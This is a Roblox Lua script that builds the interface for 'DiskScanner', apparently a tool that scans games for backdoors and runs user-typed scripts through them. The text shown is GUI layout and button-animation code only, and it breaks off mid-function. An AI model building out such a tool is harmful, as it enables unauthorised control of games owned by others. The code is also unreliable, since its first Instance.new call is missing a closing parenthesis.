--// DS \\--
--// dc: microsoftdisk \\--

--[[

 
 ██████████    █████████ 
▒▒███▒▒▒▒███  ███▒▒▒▒▒███
 ▒███   ▒▒███▒███    ▒▒▒ 
 ▒███    ▒███▒▒█████████ 
 ▒███    ▒███ ▒▒▒▒▒▒▒▒███
 ▒███    ███  ███    ▒███
 ██████████  ▒▒█████████ 
▒▒▒▒▒▒▒▒▒▒    ▒▒▒▒▒▒▒▒▒  
                         
]]--



local DSC = {};
DSC["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer.PlayerGui;
DSC["1"]["Name"] = [[dsgui]];
DSC["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;

DSC["2"] = Instance.new("Frame", DSC["1"]);
DSC["2"]["BorderSizePixel"] = 5;
DSC["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
DSC["2"]["Size"] = UDim2.new(0, 442, 0, 388);
DSC["2"]["Position"] = UDim2.new(0.39832, 0, 0.11028, 0);
DSC["2"]["BorderColor3"] = Color3.fromRGB(80, 186, 255);
DSC["2"]["Name"] = [[main]];

DSC["3"] = Instance.new("Frame", DSC["2"]);
DSC["3"]["BorderSizePixel"] = 0;
DSC["3"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
DSC["3"]["Size"] = UDim2.new(0, 407, 0, 359);
DSC["3"]["Position"] = UDim2.new(0.03846, 0, 0.03608, 0);
DSC["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);

DSC["4"] = Instance.new("TextLabel", DSC["3"]);
DSC["4"]["BorderSizePixel"] = 0;
DSC["4"]["TextSize"] = 14;
DSC["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
DSC["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
DSC["4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
DSC["4"]["BackgroundTransparency"] = 1;
DSC["4"]["Size"] = UDim2.new(0, 200, 0, 50);
DSC["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
DSC["4"]["Text"] = [[DiskScanner]];
DSC["4"]["Position"] = UDim2.new(0.25307, 0, 0, 0);

DSC["5"] = Instance.new("Folder", DSC["4"]);
DSC["5"]["Name"] = [[exec]];

DSC["6"] = Instance.new("TextButton", DSC["5"]);
DSC["6"]["TextWrapped"] = true;
DSC["6"]["BorderSizePixel"] = 3;
DSC["6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
DSC["6"]["TextSize"] = 49;
DSC["6"]["TextScaled"] = true;
DSC["6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
DSC["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
DSC["6"]["Size"] = UDim2.new(0, 124, 0, 33);
DSC["6"]["Name"] = [[exe]];
DSC["6"]["BorderColor3"] = Color3.fromRGB(80, 186, 255);
DSC["6"]["Text"] = [[Execute]];
DSC["6"]["Visible"] = false;
DSC["6"]["Position"] = UDim2.new(-0.425, 0, 6.28, 0);

DSC["7"] = Instance.new("LocalScript", DSC["6"]);
DSC["7"]["Name"] = [[Ripple]];

DSC["8"] = Instance.new("BoolValue", DSC["7"]);
DSC["8"]["Name"] = [[UseParentColor]];

DSC["9"] = Instance.new("Frame", DSC["7"]);
DSC["9"]["Visible"] = false;
DSC["9"]["ZIndex"] = -1;
DSC["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
DSC["9"]["Style"] = Enum.FrameStyle.DropShadow;
DSC["9"]["Size"] = UDim2.new(1, 10, 1, 10);
DSC["9"]["Position"] = UDim2.new(0, -5, 0, -5);
DSC["9"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["9"]["Name"] = [[DropShadow3]];

DSC["a"] = Instance.new("ImageLabel", DSC["7"]);
DSC["a"]["ZIndex"] = 3;
DSC["a"]["BorderSizePixel"] = 0;
DSC["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
DSC["a"]["ImageTransparency"] = 0.7;
DSC["a"]["ImageColor3"] = Color3.fromRGB(80, 80, 80);
DSC["a"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
DSC["a"]["Image"] = [[rbxassetid://1217158727]];
DSC["a"]["Size"] = UDim2.new(1, 0, 1, 0);
DSC["a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["a"]["BackgroundTransparency"] = 1;
DSC["a"]["Name"] = [[animated_Rounded]];
DSC["a"]["Position"] = UDim2.new(-0.5, 0, -0.5, 0);

DSC["b"] = Instance.new("BoolValue", DSC["7"]);
DSC["b"]["Name"] = [[Transparency]];
DSC["b"]["Value"] = true;

DSC["c"] = Instance.new("ImageLabel", DSC["7"]);
DSC["c"]["SliceCenter"] = Rect.new(500, 500, 500, 500);
DSC["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
DSC["c"]["ScaleType"] = Enum.ScaleType.Slice;
DSC["c"]["ImageColor3"] = Color3.fromRGB(0, 0, 0);
DSC["c"]["AnchorPoint"] = Vector2.new(0.5, 0);
DSC["c"]["Image"] = [[rbxassetid://1542279314]];
DSC["c"]["Size"] = UDim2.new(1, 10, 1, 11);
DSC["c"]["Visible"] = false;
DSC["c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["c"]["BackgroundTransparency"] = 1;
DSC["c"]["Name"] = [[shadow]];
DSC["c"]["Position"] = UDim2.new(0.5, 0, 0, -4);

DSC["d"] = Instance.new("Color3Value", DSC["7"]);
DSC["d"]["Name"] = [[animated_Color]];
DSC["d"]["Value"] = Color3.fromRGB(255, 255, 255);

DSC["e"] = Instance.new("StringValue", DSC["7"]);
DSC["e"]["Name"] = [[Ripplename]];

DSC["f"] = Instance.new("Frame", DSC["7"]);
DSC["f"]["ZIndex"] = 3;
DSC["f"]["BorderSizePixel"] = 0;
DSC["f"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
DSC["f"]["ClipsDescendants"] = true;
DSC["f"]["Size"] = UDim2.new(1, 0, 1, 0);
DSC["f"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
DSC["f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["f"]["Name"] = [[RippleContainer]];
DSC["f"]["BackgroundTransparency"] = 1;

DSC["10"] = Instance.new("ImageLabel", DSC["f"]);
DSC["10"]["ImageTransparency"] = 0.035;
DSC["10"]["Size"] = UDim2.new(1, 0, 1, 0);
DSC["10"]["ClipsDescendants"] = true;
DSC["10"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["10"]["BackgroundTransparency"] = 1;

DSC["11"] = Instance.new("StringValue", DSC["7"]);
DSC["11"]["Name"] = [[Tooltip]];

DSC["12"] = Instance.new("ImageLabel", DSC["7"]);
DSC["12"]["ZIndex"] = 2;
DSC["12"]["SliceCenter"] = Rect.new(4, 4, 252, 252);
DSC["12"]["ScaleType"] = Enum.ScaleType.Slice;
DSC["12"]["ImageTransparency"] = 1;
DSC["12"]["ImageColor3"] = Color3.fromRGB(98, 98, 98);
DSC["12"]["AnchorPoint"] = Vector2.new(0.5, 0);
DSC["12"]["Image"] = [[rbxassetid://1934624205]];
DSC["12"]["Size"] = UDim2.new(0, 20, 0, 20);
DSC["12"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["12"]["BackgroundTransparency"] = 1;
DSC["12"]["Name"] = [[TooltipFrame]];
DSC["12"]["Position"] = UDim2.new(0.5, 0, 1, 8);

DSC["13"] = Instance.new("TextLabel", DSC["12"]);
DSC["13"]["ZIndex"] = 3;
DSC["13"]["TextSize"] = 12;
DSC["13"]["TextTransparency"] = 1;
DSC["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
DSC["13"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
DSC["13"]["BackgroundTransparency"] = 1;
DSC["13"]["Size"] = UDim2.new(1, 0, 1, 0);
DSC["13"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["13"]["Text"] = [[]];

DSC["14"] = Instance.new("TextButton", DSC["5"]);
DSC["14"]["TextWrapped"] = true;
DSC["14"]["BorderSizePixel"] = 3;
DSC["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
DSC["14"]["TextSize"] = 49;
DSC["14"]["TextScaled"] = true;
DSC["14"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
DSC["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
DSC["14"]["Size"] = UDim2.new(0, 124, 0, 33);
DSC["14"]["Name"] = [[r6]];
DSC["14"]["BorderColor3"] = Color3.fromRGB(80, 186, 255);
DSC["14"]["Text"] = [[R6]];
DSC["14"]["Visible"] = false;
DSC["14"]["Position"] = UDim2.new(0.815, 0, 6.28, 0);

DSC["15"] = Instance.new("LocalScript", DSC["14"]);
DSC["15"]["Name"] = [[Ripple]];

DSC["16"] = Instance.new("BoolValue", DSC["15"]);
DSC["16"]["Name"] = [[UseParentColor]];

DSC["17"] = Instance.new("Frame", DSC["15"]);
DSC["17"]["Visible"] = false;
DSC["17"]["ZIndex"] = -1;
DSC["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
DSC["17"]["Style"] = Enum.FrameStyle.DropShadow;
DSC["17"]["Size"] = UDim2.new(1, 10, 1, 10);
DSC["17"]["Position"] = UDim2.new(0, -5, 0, -5);
DSC["17"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["17"]["Name"] = [[DropShadow3]];

DSC["18"] = Instance.new("ImageLabel", DSC["15"]);
DSC["18"]["ZIndex"] = 3;
DSC["18"]["BorderSizePixel"] = 0;
DSC["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
DSC["18"]["ImageTransparency"] = 0.7;
DSC["18"]["ImageColor3"] = Color3.fromRGB(80, 80, 80);
DSC["18"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
DSC["18"]["Image"] = [[rbxassetid://1217158727]];
DSC["18"]["Size"] = UDim2.new(1, 0, 1, 0);
DSC["18"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["18"]["BackgroundTransparency"] = 1;
DSC["18"]["Name"] = [[animated_Rounded]];
DSC["18"]["Position"] = UDim2.new(-0.5, 0, -0.5, 0);

DSC["19"] = Instance.new("BoolValue", DSC["15"]);
DSC["19"]["Name"] = [[Transparency]];
DSC["19"]["Value"] = true;

DSC["1a"] = Instance.new("ImageLabel", DSC["15"]);
DSC["1a"]["SliceCenter"] = Rect.new(500, 500, 500, 500);
DSC["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
DSC["1a"]["ScaleType"] = Enum.ScaleType.Slice;
DSC["1a"]["ImageColor3"] = Color3.fromRGB(0, 0, 0);
DSC["1a"]["AnchorPoint"] = Vector2.new(0.5, 0);
DSC["1a"]["Image"] = [[rbxassetid://1542279314]];
DSC["1a"]["Size"] = UDim2.new(1, 10, 1, 11);
DSC["1a"]["Visible"] = false;
DSC["1a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["1a"]["BackgroundTransparency"] = 1;
DSC["1a"]["Name"] = [[shadow]];
DSC["1a"]["Position"] = UDim2.new(0.5, 0, 0, -4);

DSC["1b"] = Instance.new("Color3Value", DSC["15"]);
DSC["1b"]["Name"] = [[animated_Color]];
DSC["1b"]["Value"] = Color3.fromRGB(255, 255, 255);

DSC["1c"] = Instance.new("StringValue", DSC["15"]);
DSC["1c"]["Name"] = [[Ripplename]];

DSC["1d"] = Instance.new("Frame", DSC["15"]);
DSC["1d"]["ZIndex"] = 3;
DSC["1d"]["BorderSizePixel"] = 0;
DSC["1d"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
DSC["1d"]["ClipsDescendants"] = true;
DSC["1d"]["Size"] = UDim2.new(1, 0, 1, 0);
DSC["1d"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
DSC["1d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["1d"]["Name"] = [[RippleContainer]];
DSC["1d"]["BackgroundTransparency"] = 1;

DSC["1e"] = Instance.new("ImageLabel", DSC["1d"]);
DSC["1e"]["ImageTransparency"] = 0.035;
DSC["1e"]["Size"] = UDim2.new(1, 0, 1, 0);
DSC["1e"]["ClipsDescendants"] = true;
DSC["1e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["1e"]["BackgroundTransparency"] = 1;

DSC["1f"] = Instance.new("StringValue", DSC["15"]);
DSC["1f"]["Name"] = [[Tooltip]];

DSC["20"] = Instance.new("ImageLabel", DSC["15"]);
DSC["20"]["ZIndex"] = 2;
DSC["20"]["SliceCenter"] = Rect.new(4, 4, 252, 252);
DSC["20"]["ScaleType"] = Enum.ScaleType.Slice;
DSC["20"]["ImageTransparency"] = 1;
DSC["20"]["ImageColor3"] = Color3.fromRGB(98, 98, 98);
DSC["20"]["AnchorPoint"] = Vector2.new(0.5, 0);
DSC["20"]["Image"] = [[rbxassetid://1934624205]];
DSC["20"]["Size"] = UDim2.new(0, 20, 0, 20);
DSC["20"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["20"]["BackgroundTransparency"] = 1;
DSC["20"]["Name"] = [[TooltipFrame]];
DSC["20"]["Position"] = UDim2.new(0.5, 0, 1, 8);

DSC["21"] = Instance.new("TextLabel", DSC["20"]);
DSC["21"]["ZIndex"] = 3;
DSC["21"]["TextSize"] = 12;
DSC["21"]["TextTransparency"] = 1;
DSC["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
DSC["21"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
DSC["21"]["BackgroundTransparency"] = 1;
DSC["21"]["Size"] = UDim2.new(1, 0, 1, 0);
DSC["21"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["21"]["Text"] = [[]];

DSC["22"] = Instance.new("TextButton", DSC["5"]);
DSC["22"]["TextWrapped"] = true;
DSC["22"]["BorderSizePixel"] = 3;
DSC["22"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
DSC["22"]["TextSize"] = 49;
DSC["22"]["TextScaled"] = true;
DSC["22"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
DSC["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
DSC["22"]["Size"] = UDim2.new(0, 124, 0, 33);
DSC["22"]["Name"] = [[cle]];
DSC["22"]["BorderColor3"] = Color3.fromRGB(80, 186, 255);
DSC["22"]["Text"] = [[Clear]];
DSC["22"]["Visible"] = false;
DSC["22"]["Position"] = UDim2.new(0.195, 0, 6.28, 0);

DSC["23"] = Instance.new("LocalScript", DSC["22"]);
DSC["23"]["Name"] = [[Ripple]];

DSC["24"] = Instance.new("BoolValue", DSC["23"]);
DSC["24"]["Name"] = [[UseParentColor]];

DSC["25"] = Instance.new("Frame", DSC["23"]);
DSC["25"]["Visible"] = false;
DSC["25"]["ZIndex"] = -1;
DSC["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
DSC["25"]["Style"] = Enum.FrameStyle.DropShadow;
DSC["25"]["Size"] = UDim2.new(1, 10, 1, 10);
DSC["25"]["Position"] = UDim2.new(0, -5, 0, -5);
DSC["25"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["25"]["Name"] = [[DropShadow3]];

DSC["26"] = Instance.new("ImageLabel", DSC["23"]);
DSC["26"]["ZIndex"] = 3;
DSC["26"]["BorderSizePixel"] = 0;
DSC["26"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
DSC["26"]["ImageTransparency"] = 0.7;
DSC["26"]["ImageColor3"] = Color3.fromRGB(80, 80, 80);
DSC["26"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
DSC["26"]["Image"] = [[rbxassetid://1217158727]];
DSC["26"]["Size"] = UDim2.new(1, 0, 1, 0);
DSC["26"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["26"]["BackgroundTransparency"] = 1;
DSC["26"]["Name"] = [[animated_Rounded]];
DSC["26"]["Position"] = UDim2.new(-0.5, 0, -0.5, 0);

DSC["27"] = Instance.new("BoolValue", DSC["23"]);
DSC["27"]["Name"] = [[Transparency]];
DSC["27"]["Value"] = true;

DSC["28"] = Instance.new("ImageLabel", DSC["23"]);
DSC["28"]["SliceCenter"] = Rect.new(500, 500, 500, 500);
DSC["28"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
DSC["28"]["ScaleType"] = Enum.ScaleType.Slice;
DSC["28"]["ImageColor3"] = Color3.fromRGB(0, 0, 0);
DSC["28"]["AnchorPoint"] = Vector2.new(0.5, 0);
DSC["28"]["Image"] = [[rbxassetid://1542279314]];
DSC["28"]["Size"] = UDim2.new(1, 10, 1, 11);
DSC["28"]["Visible"] = false;
DSC["28"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["28"]["BackgroundTransparency"] = 1;
DSC["28"]["Name"] = [[shadow]];
DSC["28"]["Position"] = UDim2.new(0.5, 0, 0, -4);

DSC["29"] = Instance.new("Color3Value", DSC["23"]);
DSC["29"]["Name"] = [[animated_Color]];
DSC["29"]["Value"] = Color3.fromRGB(255, 255, 255);

DSC["2a"] = Instance.new("StringValue", DSC["23"]);
DSC["2a"]["Name"] = [[Ripplename]];

DSC["2b"] = Instance.new("Frame", DSC["23"]);
DSC["2b"]["ZIndex"] = 3;
DSC["2b"]["BorderSizePixel"] = 0;
DSC["2b"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
DSC["2b"]["ClipsDescendants"] = true;
DSC["2b"]["Size"] = UDim2.new(1, 0, 1, 0);
DSC["2b"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
DSC["2b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["2b"]["Name"] = [[RippleContainer]];
DSC["2b"]["BackgroundTransparency"] = 1;

DSC["2c"] = Instance.new("ImageLabel", DSC["2b"]);
DSC["2c"]["ImageTransparency"] = 0.035;
DSC["2c"]["Size"] = UDim2.new(1, 0, 1, 0);
DSC["2c"]["ClipsDescendants"] = true;
DSC["2c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["2c"]["BackgroundTransparency"] = 1;

DSC["2d"] = Instance.new("StringValue", DSC["23"]);
DSC["2d"]["Name"] = [[Tooltip]];

DSC["2e"] = Instance.new("ImageLabel", DSC["23"]);
DSC["2e"]["ZIndex"] = 2;
DSC["2e"]["SliceCenter"] = Rect.new(4, 4, 252, 252);
DSC["2e"]["ScaleType"] = Enum.ScaleType.Slice;
DSC["2e"]["ImageTransparency"] = 1;
DSC["2e"]["ImageColor3"] = Color3.fromRGB(98, 98, 98);
DSC["2e"]["AnchorPoint"] = Vector2.new(0.5, 0);
DSC["2e"]["Image"] = [[rbxassetid://1934624205]];
DSC["2e"]["Size"] = UDim2.new(0, 20, 0, 20);
DSC["2e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["2e"]["BackgroundTransparency"] = 1;
DSC["2e"]["Name"] = [[TooltipFrame]];
DSC["2e"]["Position"] = UDim2.new(0.5, 0, 1, 8);

DSC["2f"] = Instance.new("TextLabel", DSC["2e"]);
DSC["2f"]["ZIndex"] = 3;
DSC["2f"]["TextSize"] = 12;
DSC["2f"]["TextTransparency"] = 1;
DSC["2f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
DSC["2f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
DSC["2f"]["BackgroundTransparency"] = 1;
DSC["2f"]["Size"] = UDim2.new(1, 0, 1, 0);
DSC["2f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["2f"]["Text"] = [[]];

DSC["30"] = Instance.new("TextBox", DSC["5"]);
DSC["30"]["Visible"] = false;
DSC["30"]["CursorPosition"] = -1;
DSC["30"]["Name"] = [[ScriptBox]];
DSC["30"]["TextXAlignment"] = Enum.TextXAlignment.Left;
DSC["30"]["BorderSizePixel"] = 3;
DSC["30"]["TextWrapped"] = true;
DSC["30"]["TextSize"] = 17;
DSC["30"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
DSC["30"]["TextYAlignment"] = Enum.TextYAlignment.Top;
DSC["30"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
DSC["30"]["RichText"] = true;
DSC["30"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
DSC["30"]["ClearTextOnFocus"] = false;
DSC["30"]["PlaceholderText"] = [[-- ds was made by disk, feel free to contact microsoftdisk for feedbacks]];
DSC["30"]["Size"] = UDim2.new(0, 373, 0, 252);
DSC["30"]["Position"] = UDim2.new(-0.42834, 0, 0.86917, 0);
DSC["30"]["BorderColor3"] = Color3.fromRGB(80, 186, 255);
DSC["30"]["Text"] = [[]];

DSC["31"] = Instance.new("Folder", DSC["4"]);
DSC["31"]["Name"] = [[scanner]];

DSC["32"] = Instance.new("TextButton", DSC["31"]);
DSC["32"]["TextWrapped"] = true;
DSC["32"]["BorderSizePixel"] = 3;
DSC["32"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
DSC["32"]["TextSize"] = 49;
DSC["32"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
DSC["32"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
DSC["32"]["Size"] = UDim2.new(0, 339, 0, 283);
DSC["32"]["Name"] = [[scan]];
DSC["32"]["BorderColor3"] = Color3.fromRGB(80, 186, 255);
DSC["32"]["Text"] = [[Scan for Backdoor]];
DSC["32"]["Position"] = UDim2.new(-0.35, 0, 1, 0);

DSC["33"] = Instance.new("LocalScript", DSC["32"]);
DSC["33"]["Name"] = [[Ripple]];

DSC["34"] = Instance.new("BoolValue", DSC["33"]);
DSC["34"]["Name"] = [[UseParentColor]];

DSC["35"] = Instance.new("Frame", DSC["33"]);
DSC["35"]["Visible"] = false;
DSC["35"]["ZIndex"] = -1;
DSC["35"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
DSC["35"]["Style"] = Enum.FrameStyle.DropShadow;
DSC["35"]["Size"] = UDim2.new(1, 10, 1, 10);
DSC["35"]["Position"] = UDim2.new(0, -5, 0, -5);
DSC["35"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["35"]["Name"] = [[DropShadow3]];

DSC["36"] = Instance.new("ImageLabel", DSC["33"]);
DSC["36"]["ZIndex"] = 3;
DSC["36"]["BorderSizePixel"] = 0;
DSC["36"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
DSC["36"]["ImageTransparency"] = 0.7;
DSC["36"]["ImageColor3"] = Color3.fromRGB(80, 80, 80);
DSC["36"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
DSC["36"]["Image"] = [[rbxassetid://1217158727]];
DSC["36"]["Size"] = UDim2.new(1, 0, 1, 0);
DSC["36"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["36"]["BackgroundTransparency"] = 1;
DSC["36"]["Name"] = [[animated_Rounded]];
DSC["36"]["Position"] = UDim2.new(-0.5, 0, -0.5, 0);

DSC["37"] = Instance.new("BoolValue", DSC["33"]);
DSC["37"]["Name"] = [[Transparency]];
DSC["37"]["Value"] = true;

DSC["38"] = Instance.new("ImageLabel", DSC["33"]);
DSC["38"]["SliceCenter"] = Rect.new(500, 500, 500, 500);
DSC["38"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
DSC["38"]["ScaleType"] = Enum.ScaleType.Slice;
DSC["38"]["ImageColor3"] = Color3.fromRGB(0, 0, 0);
DSC["38"]["AnchorPoint"] = Vector2.new(0.5, 0);
DSC["38"]["Image"] = [[rbxassetid://1542279314]];
DSC["38"]["Size"] = UDim2.new(1, 10, 1, 11);
DSC["38"]["Visible"] = false;
DSC["38"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["38"]["BackgroundTransparency"] = 1;
DSC["38"]["Name"] = [[shadow]];
DSC["38"]["Position"] = UDim2.new(0.5, 0, 0, -4);

DSC["39"] = Instance.new("Color3Value", DSC["33"]);
DSC["39"]["Name"] = [[animated_Color]];
DSC["39"]["Value"] = Color3.fromRGB(255, 255, 255);

DSC["3a"] = Instance.new("StringValue", DSC["33"]);
DSC["3a"]["Name"] = [[Ripplename]];

DSC["3b"] = Instance.new("Frame", DSC["33"]);
DSC["3b"]["ZIndex"] = 3;
DSC["3b"]["BorderSizePixel"] = 0;
DSC["3b"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
DSC["3b"]["ClipsDescendants"] = true;
DSC["3b"]["Size"] = UDim2.new(1, 0, 1, 0);
DSC["3b"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
DSC["3b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["3b"]["Name"] = [[RippleContainer]];
DSC["3b"]["BackgroundTransparency"] = 1;

DSC["3c"] = Instance.new("ImageLabel", DSC["3b"]);
DSC["3c"]["ImageTransparency"] = 0.035;
DSC["3c"]["Size"] = UDim2.new(1, 0, 1, 0);
DSC["3c"]["ClipsDescendants"] = true;
DSC["3c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["3c"]["BackgroundTransparency"] = 1;

DSC["3d"] = Instance.new("StringValue", DSC["33"]);
DSC["3d"]["Name"] = [[Tooltip]];

DSC["3e"] = Instance.new("ImageLabel", DSC["33"]);
DSC["3e"]["ZIndex"] = 2;
DSC["3e"]["SliceCenter"] = Rect.new(4, 4, 252, 252);
DSC["3e"]["ScaleType"] = Enum.ScaleType.Slice;
DSC["3e"]["ImageTransparency"] = 1;
DSC["3e"]["ImageColor3"] = Color3.fromRGB(98, 98, 98);
DSC["3e"]["AnchorPoint"] = Vector2.new(0.5, 0);
DSC["3e"]["Image"] = [[rbxassetid://1934624205]];
DSC["3e"]["Size"] = UDim2.new(0, 20, 0, 20);
DSC["3e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["3e"]["BackgroundTransparency"] = 1;
DSC["3e"]["Name"] = [[TooltipFrame]];
DSC["3e"]["Position"] = UDim2.new(0.5, 0, 1, 8);

DSC["3f"] = Instance.new("TextLabel", DSC["3e"]);
DSC["3f"]["ZIndex"] = 3;
DSC["3f"]["TextSize"] = 12;
DSC["3f"]["TextTransparency"] = 1;
DSC["3f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
DSC["3f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
DSC["3f"]["BackgroundTransparency"] = 1;
DSC["3f"]["Size"] = UDim2.new(1, 0, 1, 0);
DSC["3f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
DSC["3f"]["Text"] = [[]];

DSC["40"] = Instance.new("LocalScript", DSC["2"]);
DSC["40"]["Name"] = [[client]];

local function C_7()
	local script = DSC["7"];
	local save = "229, 229, 229"
	local Button = script.Parent
	function active_button()

	end

	local Ripplename = script:WaitForChild("Ripplename")
	local Transparency = script:WaitForChild("Transparency")
	local UseParentColor = script:WaitForChild("UseParentColor")
	local animated_Color = script:WaitForChild("animated_Color")
	local DropShadow3 = script:WaitForChild("DropShadow3")
	local RippleContainer = script:WaitForChild("RippleContainer")
	local animated_Rounded = script:WaitForChild("animated_Rounded")
	local shadow = script:WaitForChild("shadow")
	local Tooltip = script:WaitForChild("Tooltip")
	local TooltipFrame = script:WaitForChild("TooltipFrame")

	local TooltipFrameClone = TooltipFrame:Clone()
	TooltipFrameClone.Parent = Button

	local Shadow_drog = shadow:Clone()
	local Shadow = DropShadow3:Clone()
	Shadow.Parent = Button

	local Frame = Instance.new("ImageLabel", Button)
	Frame.ClipsDescendants = true
	Frame.BackgroundTransparency = 1
	Frame.BorderSizePixel = 0
	Frame.Size = UDim2.new(1, 0, 1, 0)
	Frame.Position = UDim2.new(0, 0, 0, 0)
	Frame.BackgroundColor3 = animated_Color.Value
	Frame.Name = "TransIn"
	if Button:IsA("ImageButton") then
		Frame.Image = Button.Image
	else
		Frame.Image = ""
	end

	local BackCheck = Instance.new("Frame",Button)
	BackCheck.Size = UDim2.new(1,0,1,0)
	BackCheck.Position = UDim2.new(0,0,0,0)
	BackCheck.BackgroundTransparency = 1
	BackCheck.BorderSizePixel = 0
	BackCheck.Name = "BackFrame"

	local RippleOut = Instance.new("BindableEvent",script)
	RippleOut.Name = "RippleOut"

	Frame.ImageTransparency = 1
	Button.AutoButtonColor = false
	Shadow_drog.Parent = Button
	Frame.ZIndex = 3
	Button.ZIndex = 2
	RippleFrame = RippleContainer:Clone()
	RippleFrame.Parent = Button

	function chcolor()
		if UseParentColor.Value == true then
			if Button.ClassName == "ImageButton" then
				animated_Rounded.ImageColor3 = Button.ImageColor3
				Frame.BackgroundColor3 = Button.ImageColor3
				Frame.ImageColor3 = Button.ImageColor3
			else
				animated_Rounded.ImageColor3 = Button.BackgroundColor3
				Frame.BackgroundColor3 = Button.BackgroundColor3
				Frame.ImageColor3 = Button.BackgroundColor3
			end
		else
			animated_Rounded.ImageColor3 = animated_Color.Value
			Frame.BackgroundColor3 = animated_Color.Value
			Frame.ImageColor3 = animated_Color.Value
			if Button.ClassName == "ImageButton" then
				Frame.ScaleType = Button.ScaleType
